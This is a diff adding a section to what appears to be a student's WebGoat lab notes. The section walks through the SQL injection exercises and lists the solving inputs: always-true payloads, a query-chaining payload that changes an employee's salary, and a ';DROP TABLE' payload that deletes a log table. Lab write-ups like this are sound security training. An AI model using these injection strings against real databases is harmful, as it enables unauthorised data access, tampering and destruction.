@@ -214,6 +214,48 @@ To install WebGoat, I followed the tutorial from [Karvinen 2021, Install Webgoat
 For HTTP Basics: I found the magic number by checking the request.
 For Developer tools: I used the Developer tools (console tab) from Google Chrome to call the function. I also used the network tab to find the networkNum.
 
+
+## (A1) SQL injection
+### What is SQL?
+
+    SELECT department FROM employees WHERE last_name = 'Bob' AND last_name = 'Franco';
+
+### Data Manipulation Language (DML)
+
+    UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
+
+### Data Definition Language (DDL)
+
+    ALTER TABLE employees ADD phone varchar(20);
+
+### Data Control Language (DCL)
+
+    GRANT ALTER TABLE TO UnauthorizedUser;
+
+### Try it! String SQL injection
+
+    SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
+
+### Try it! Numeric SQL injection
+
+    "SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
+    login_Count: 1
+    User_id: 1 or 1=1;
+
+### Compromising Confidentiality with String SQL injection
+
+    "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
+    Employee Name:
+    Authentication TAN: 
+
+### Compromising Integrity with Query chaining
+
+    Employee Name: abc'; UPDATE employees SET salary = '85000' WHERE userid = '37648'--
+
+### Compromising Availability
+
+    Action contains: ';DROP TABLE access_log;--
+
 ------
 
 <a name="funda"></a>
